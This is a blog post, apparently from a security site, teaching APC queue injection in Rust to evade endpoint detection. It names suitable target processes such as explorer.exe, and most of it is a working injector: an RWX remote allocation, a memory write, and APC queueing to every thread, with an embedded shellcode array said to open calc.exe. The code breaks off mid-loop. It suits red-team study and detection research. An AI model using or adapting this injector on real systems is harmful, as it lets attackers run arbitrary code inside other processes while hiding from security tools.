@@ -1,0 +1,287 @@
+# https://fluxsec.red/apc-queue-injection-rust
+
+<!DOCTYPE html><html lang="en" class="fontawesome-i2svg-active fontawesome-i2svg-complete">
+<body>
+    <div class="container">
+        
+          
+        <main class="main-content">
+            <h1>EDR Evasion APC Queue Injection in Rust</h1>
+            <p class="description">You get a thread, you get a thread, and YOU get a thread!</p>
+            <hr>
+            <h2 id="introduction">Introduction</h2>
+
+<p>The project can be found here on my <a href="https://github.com/0xflux/Rust-APC-Queue-Injection" target="_blank">GitHub</a>. This post is provided for red teamers and anybody interested in offensive cyber for legal purposes only. See my <a href="https://fluxsec.red/#legal-disclaimer" target="_blank">legal disclaimer</a>.</p>
+
+<p>This is yet another post in my EDR Evasion series, looking at techniques which bypass Endpoint Detection and Response. This time we will be looking at APC - Asynchronous Procedure Calls. For reference, you can read the Windows docs <a href="https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls" target="_blank">here</a>.</p>
+
+<div class="info-box">
+  <p><svg class="svg-inline--fa fa-circle-info" style="color: #638be3;" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="circle-info" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M256 512A256 256 0 1 0 256 0a256 256 0 1 0 0 512zM216 336h24V272H216c-13.3 0-24-10.7-24-24s10.7-24 24-24h48c13.3 0 24 10.7 24 24v88h8c13.3 0 24 10.7 24 24s-10.7 24-24 24H216c-13.3 0-24-10.7-24-24s10.7-24 24-24zm40-208a32 32 0 1 1 0 64 32 32 0 1 1 0-64z"></path></svg><!-- <i class="fa-solid fa-circle-info" style="color: #638be3;"></i> Font Awesome fontawesome.com -->
+  <strong>Note</strong>: When we talk about EDR evasion with techniques such as ETW bypasses, APC Queue Injection, and Process Injection - these can STILL be detected by more sophisticated EDR's. 
+  By modern standards, these techniques are outdated, but are still worth learning as it teaches us techniques which <strong>can</strong> still work.</p>
+  <p>If you are interested in learning about how modern EDRs can detect this type of behaviour, I have a blog series where I am building an EDR from scratch, and you can check the 
+  specifics about detecting these bypass techniques <a href="https://fluxsec.red/event-tracing-for-windows-threat-intelligence-rust-consumer" target="_blank">here</a>.</p>
+</div>
+
+<p>APC’s (Asynchronous Procedure Calls) allow a thread to execute a specific function asynchronously at some point in the future. A function can be queued to the APC queue for a specific thread for it to be executed, when that thread becomes ‘alertable’.</p>
+
+<p>APC’s are a strange thing, in that I have never seen them used in a project I have worked on, or developed myself. However, to provide some examples of why developers may wish to use APC’s:</p>
+
+<ul>
+<li>Networking: In network applications, APCs allow for non-blocking socket operations. This means a thread can continue processing other tasks while waiting for data to be sent or received, improving the application’s responsiveness.</li>
+<li>File System: When performing file read/write operations, APCs can be used to queue completion routines, allowing the thread to handle other tasks while waiting for I/O operations to complete.</li>
+<li>Signaling: APCs facilitate communication between threads by allowing one thread to queue a function for execution by another thread. This is useful for signaling and coordinating complex multi-threaded operations.</li>
+</ul>
+
+<p>Performing a <a href="https://github.com/search?q=QueueUserAPC&amp;type=code" target="_blank">GitHub search</a> for the Windows API function <code>QueueUserAPC</code> brings back 21.9k files which reference this API call, so, clearly, it is a well used feature of Windows programming. Somewhat hilariously, in the first few pages of results, the projects all relate to malware in some way (performing various injection techniques).</p>
+
+<p>So, if we can callback to some function on a thread when it becomes alertable, what exactly does it mean for a thread to be alertable?</p>
+
+<p>Pulling directly from the <a href="https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls" target="_blank">Windows docs</a>:</p>
+
+<p>When a user-mode APC is queued, the thread to which it is queued is not directed to call the APC function unless it is in an alertable state. A thread enters an alertable state when it calls the SleepEx, SignalObjectAndWait, MsgWaitForMultipleObjectsEx, WaitForMultipleObjectsEx, or WaitForSingleObjectEx function. If the wait is satisfied before the APC is queued, the thread is no longer in an alertable wait state so the APC function will not be executed. However, the APC is still queued, so the APC function will be executed when the thread calls another alertable wait function.</p>
+
+<p>There is a downside to this technique, you need to inject into a process where a thread is likely to become alertable. Some good candidates would be <strong>explorer.exe</strong>, <strong>notepad.exe</strong> (on Windows 11 at least), and perhaps any web browser.</p>
+
+<p>By leveraging existing threads in a target process, this technique reduces the risk of detection.</p>
+
+<p>Here is an image I made to try help visualise this concept:</p>
+
+<p><img class="wide-img" src="https://fluxsec.red/static/images/apc_injection.png" alt="APC Queue Injection EDR Evasion"></p>
+
+<h2 id="edr-evasion">EDR Evasion</h2>
+
+<p>So, why is this a technique that can bypass EDR?</p>
+
+<p>During process injection, we make very suspicious calls, such as WriteProcessMemory and CreateRemoteThread, see my post here explaining <a href="https://fluxsec.red/remote-process-dll-injection" target="_blank">process injection</a>. These API’s are highly suspicious, and should be blocked by any EDR worth its salt. There are numerous ways to bypass EDR, as documented so far in my blog posts for <a href="https://fluxsec.red/rust-edr-evasion-hells-gate" target="_blank">Hells Gate</a> and <a href="https://fluxsec.red/etw-patching-rust" target="_blank">ETW Evasion</a>.</p>
+
+<p>Using APC Queue Injection allows us to bypass the requirement of CreateRemoteThread which almost certainly should trigger EDR. This technique alone may not require things such as Hell’s Gate to sneak past the EDR, making it a really valuable tool.</p>
+
+<p>Think about it, instead of calling the dangerous <code>CreateRemoteThread</code> to spawn a <strong>new</strong> thread in the remote process, we can simply queue something to a thread which already exists.</p>
+
+<p>So what do we queue? We queue a <strong>function pointer</strong> to where our shellcode is in the remote process.</p>
+
+<p>Here’s what we do, I won’t be covering this in any real detail as I have covered this in other blog posts, but:</p>
+
+<ol>
+<li>Open a handle to the remote process</li>
+<li>Create new memory in that process equal to the size of our shellcode, setting the region to executable</li>
+<li>Write the shellcode to the new memory</li>
+<li>Enumerate all threads in the remote process, and for each thread, use <code>QueueUserAPC</code> passing in a pointer to our shellcode</li>
+<li>Sit back, relax, and wait for it to execute.</li>
+</ol>
+
+<h2 id="shellcode">Shellcode</h2>
+
+<p>As for our shellcode, I have created a project on <a href="https://github.com/0xflux/rust_shellcode/tree/master" target="_blank">GitHub</a> which allows you to create shellcode from a high level rust program. The caveats are that the high level program cannot use the standard library, and you should keep all allocations to the stack. Allocating to the heap may still work, but I wouldn’t have any confidence in that. Note, that project is heavily inspired by the work of <a href="https://github.com/b1tg/rust-windows-shellcode" target="_blank">b1tg</a>, I made some of my own modifications. Also, of note, is that the shellcode you produce should not end in a <code>loop {}</code>, this loop will cause the threads in the target process to block, which will block the process you are injecting into. Not very stealthy.</p>
+
+<h2 id="the-code">The code</h2>
+
+<p>Let’s get straight to the code. I’ve explained most of the Windows functions we are using in my blog post on <a href="https://fluxsec.red/remote-process-dll-injection" target="_blank">DLL injection</a>. The only additional bit of code really is using shellcode and then enumerating threads and calling <code>QueueUserAPC</code>.</p>
+
+<p>It’s also worth noting, the shellcode here will open calc.exe.</p>
+
+<pre><code class="language-Rust hljs" data-highlighted="yes"><span class="hljs-keyword">use</span> std::{
+    env, ffi::c_void, mem, process::exit, thread::sleep, time::Duration,
+};
+<span class="hljs-keyword">use</span> windows::Win32::{
+    Foundation::{CloseHandle, GetLastError, PAPCFUNC},
+    System::{
+        Diagnostics::{
+            <span class="hljs-built_in">Debug</span>::WriteProcessMemory,
+            ToolHelp::{
+                CreateToolhelp32Snapshot, Thread32First, Thread32Next, TH32CS_SNAPTHREAD,
+                THREADENTRY32,
+            },
+        },
+        Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE},
+        Threading::{OpenProcess, OpenThread, QueueUserAPC, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS},
+    },
+};
+
+<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
+    <span class="hljs-comment">// to see how i generated this shellcode, check https://github.com/0xflux/rust_shellcode</span>
+    <span class="hljs-keyword">let</span> <span class="hljs-variable">payload</span>: [<span class="hljs-type">u8</span>; <span class="hljs-number">434</span>] = [
+        <span class="hljs-number">0xeb</span>, <span class="hljs-number">0x4e</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xa4</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x4b</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x45</span>,
+        <span class="hljs-number">0x00</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x4e</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x2e</span>, <span class="hljs-number">0x00</span>,
+        <span class="hljs-number">0x44</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x6e</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x63</span>,
+        <span class="hljs-number">0x00</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x2e</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,
+        <span class="hljs-number">0x00</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,
+        <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xc7</span>, <span class="hljs-number">0xc1</span>, <span class="hljs-number">0x00</span>,
+        <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xc7</span>, <span class="hljs-number">0xc2</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x0c</span>, <span class="hljs-number">0x25</span>,
+        <span class="hljs-number">0x60</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0x15</span>,
+        <span class="hljs-number">0x90</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xc1</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xc0</span>, <span class="hljs-number">0x74</span>,
+        <span class="hljs-number">0x3d</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0xc7</span>, <span class="hljs-number">0xc1</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0xff</span>,
+        <span class="hljs-number">0x66</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x7c</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xf3</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x83</span>,
+        <span class="hljs-number">0xf9</span>, <span class="hljs-number">0x0c</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xc9</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x0f</span>,
+        <span class="hljs-number">0xb7</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x3b</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xd9</span>,
+        <span class="hljs-number">0x74</span>, <span class="hljs-number">0xe7</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0xc1</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xb2</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x12</span>,
+        <span class="hljs-number">0xeb</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x38</span>,
+        <span class="hljs-number">0x4d</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x3c</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x08</span>,
+        <span class="hljs-number">0x88</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0x46</span>,
+        <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xdb</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x15</span>,
+        <span class="hljs-number">0xff</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0xd3</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0x73</span>,
+        <span class="hljs-number">0x01</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xdb</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0x3c</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x3c</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x3c</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x00</span>,
+        <span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xf3</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0xe0</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xc7</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0xc7</span>, <span class="hljs-number">0xc6</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0xff</span>,
+        <span class="hljs-number">0x42</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x7c</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xf4</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xf3</span>,
+        <span class="hljs-number">0x49</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xfe</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xc1</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xdb</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x42</span>,
+        <span class="hljs-number">0x8a</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x3a</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x1f</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xf3</span>, <span class="hljs-number">0x74</span>,
+        <span class="hljs-number">0xe9</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xf3</span>, <span class="hljs-number">0xeb</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0xb7</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x81</span>,
+        <span class="hljs-number">0xe2</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0x0c</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xc0</span>,
+        <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0x0d</span>, <span class="hljs-number">0xa1</span>, <span class="hljs-number">0xfe</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0xba</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x5b</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0x5f</span>,
+        <span class="hljs-number">0x5e</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x5e</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0xe0</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0xeb</span>, <span class="hljs-number">0xe3</span>, <span class="hljs-number">0xcc</span>,
+        <span class="hljs-number">0x01</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0xe0</span>,
+    ];
+
+    <span class="hljs-comment">// get the pid from commandline</span>
+    <span class="hljs-keyword">let</span> <span class="hljs-variable">pid</span> = <span class="hljs-title function_ invoke__">collect_proc_addr</span>();
+
+    <span class="hljs-comment">// ####################################################</span>
+    <span class="hljs-comment">// GET HANDLE TO REMOTE PROCESS</span>
+    <span class="hljs-keyword">let</span> <span class="hljs-variable">h_process</span> = <span class="hljs-keyword">unsafe</span> { <span class="hljs-title function_ invoke__">OpenProcess</span>(PROCESS_ALL_ACCESS, <span class="hljs-literal">false</span>, pid) };
+    <span class="hljs-keyword">let</span> <span class="hljs-variable">h_process</span> = <span class="hljs-keyword">match</span> h_process {
+        <span class="hljs-title function_ invoke__">Ok</span>(h) =&gt; {
+            <span class="hljs-built_in">println!</span>(<span class="hljs-string">"[+] Got handle to process ID {pid}, handle: {:?}"</span>, h);
+            h <span class="hljs-comment">// return the handle</span>
+        }
+        <span class="hljs-title function_ invoke__">Err</span>(e) =&gt; <span class="hljs-built_in">panic!</span>(<span class="hljs-string">"[-] Could not get handle to pid {pid}, error: {e}"</span>),
+    };
+
+    <span class="hljs-keyword">let</span> <span class="hljs-variable">payload_len</span> = payload.<span class="hljs-title function_ invoke__">len</span>();
+    <span class="hljs-keyword">let</span> <span class="hljs-variable">payload_ptr</span>: *<span class="hljs-keyword">const</span> c_void = payload.<span class="hljs-title function_ invoke__">as_ptr</span>() <span class="hljs-keyword">as</span> *<span class="hljs-keyword">const</span> c_void;
+
+    <span class="hljs-keyword">unsafe</span> {
+        <span class="hljs-comment">// ####################################################</span>
+        <span class="hljs-comment">// ALLOCATE MEMORY IN REMOTE PROCESS</span>
+
+        <span class="hljs-keyword">let</span> <span class="hljs-variable">remotememory_ptr</span>: *<span class="hljs-keyword">mut</span> c_void = <span class="hljs-title function_ invoke__">VirtualAllocEx</span>(
+            h_process,
+            <span class="hljs-literal">None</span>,
+            payload_len,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_EXECUTE_READWRITE,
+        );
+
+        <span class="hljs-keyword">if</span> remotememory_ptr.<span class="hljs-title function_ invoke__">is_null</span>() {
+            <span class="hljs-built_in">panic!</span>(<span class="hljs-string">"[-] Did not create memory. {:?}"</span>, <span class="hljs-title function_ invoke__">GetLastError</span>());
+        }
+        <span class="hljs-built_in">println!</span>(<span class="hljs-string">"[+] Allocated memory address: {:p}"</span>, remotememory_ptr);
+
+        <span class="hljs-comment">// ####################################################</span>
+        <span class="hljs-comment">// WRITE PROCESS MEMORY</span>
+
+        <span class="hljs-keyword">let</span> <span class="hljs-variable">result_writeprocessmemory</span> =
+            <span class="hljs-title function_ invoke__">WriteProcessMemory</span>(h_process, remotememory_ptr, payload_ptr, payload_len, <span class="hljs-literal">None</span>);
+
+        <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> <span class="hljs-variable">Err</span>(e) = result_writeprocessmemory {
+            <span class="hljs-built_in">panic!</span>(<span class="hljs-string">"[-] Error writing process memory {e}"</span>);
+        }
+        <span class="hljs-built_in">println!</span>(<span class="hljs-string">"[+] Successfully wrote process memory."</span>);
+
+        <span class="hljs-comment">// ####################################################</span>
+        <span class="hljs-comment">// INJECT VIA APC QUEUEING</span>
+
+        <span class="hljs-comment">// fn pointer for the start routine</span>
+        <span class="hljs-keyword">let</span> <span class="hljs-variable">p_thread_start_routine</span>: <span class="hljs-type">Option</span>&lt;<span class="hljs-keyword">unsafe</span> <span class="hljs-keyword">extern</span> <span class="hljs-string">"system"</span> <span class="hljs-title function_ invoke__">fn</span>(<span class="hljs-type">usize</span>)&gt; =
+            mem::<span class="hljs-title function_ invoke__">transmute</span>(remotememory_ptr);
+
+        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">threads</span>: <span class="hljs-type">Vec</span>&lt;<span class="hljs-type">u32</span>&gt; = <span class="hljs-type">Vec</span>::<span class="hljs-title function_ invoke__">new</span>(); <span class="hljs-comment">// to store all threads in the target process</span>
+
+        <span class="hljs-comment">// get the snapshot</span>
+        <span class="hljs-keyword">let</span> <span class="hljs-variable">snapshot</span> = <span class="hljs-title function_ invoke__">CreateToolhelp32Snapshot</span>(TH32CS_SNAPTHREAD, <span class="hljs-number">0</span>);
+        <span class="hljs-keyword">if</span> snapshot.<span class="hljs-title function_ invoke__">is_err</span>() {
+            <span class="hljs-built_in">panic!</span>(<span class="hljs-string">"[-] Failed to create snapshot"</span>);
+        }
+
+        <span class="hljs-comment">// construct THREADENTRY32</span>
+        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">thread_entry</span> = THREADENTRY32 {
+            dwSize: std::mem::size_of::&lt;THREADENTRY32&gt;() <span class="hljs-keyword">as</span> <span class="hljs-type">u32</span>,
+            ..<span class="hljs-built_in">Default</span>::<span class="hljs-title function_ invoke__">default</span>()
+        };
+
+        <span class="hljs-comment">// enumerate the threads in the process</span>
+        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">success</span> = <span class="hljs-title function_ invoke__">Thread32First</span>(snapshot.<span class="hljs-title function_ invoke__">clone</span>().<span class="hljs-title function_ invoke__">unwrap</span>(), &amp;<span class="hljs-keyword">mut</span> thread_entry);
+        <span class="hljs-keyword">while</span> success.<span class="hljs-title function_ invoke__">is_ok</span>() {
+            <span class="hljs-keyword">if</span> thread_entry.th32OwnerProcessID == pid {
+                threads.<span class="hljs-title function_ invoke__">push</span>(thread_entry.th32ThreadID);
+            }
+            success = <span class="hljs-title function_ invoke__">Thread32Next</span>(snapshot.<span class="hljs-title function_ invoke__">clone</span>().<span class="hljs-title function_ invoke__">unwrap</span>(), &amp;<span class="hljs-keyword">mut</span> thread_entry);
+        }
+
+        <span class="hljs-keyword">let</span> <span class="hljs-variable">_</span> = <span class="hljs-title function_ invoke__">CloseHandle</span>(snapshot.<span class="hljs-title function_ invoke__">unwrap</span>());
+
+        <span class="hljs-keyword">if</span> threads.<span class="hljs-title function_ invoke__">is_empty</span>() {
+            <span class="hljs-comment">// if no threads, then panic, no point continuing execution</span>
+            <span class="hljs-built_in">panic!</span>(<span class="hljs-string">"[-] No threads found for PID: {}"</span>, pid);
+        } <span class="hljs-keyword">else</span> {
+            <span class="hljs-built_in">println!</span>(<span class="hljs-string">"[+] Threads found: {:?}"</span>, threads);
+        }
+
+        <span class="hljs-comment">// iterate through the threads, and queue the APC for that thread</span>
+        <span class="hljs-keyword">for</span> <span class="hljs-variable">thread</span> <span class="hljs-keyword">in</span> threads {
+            <span class="hljs-comment">// open the thread and get a handle</span>
+            <span class="hljs-keyword">let</span> <span class="hljs-variable">thread_handle</span> = <span class="hljs-title function_ invoke__">OpenThread</span>(THREAD_ALL_ACCESS, <span class="hljs-literal">true</span>, thread);
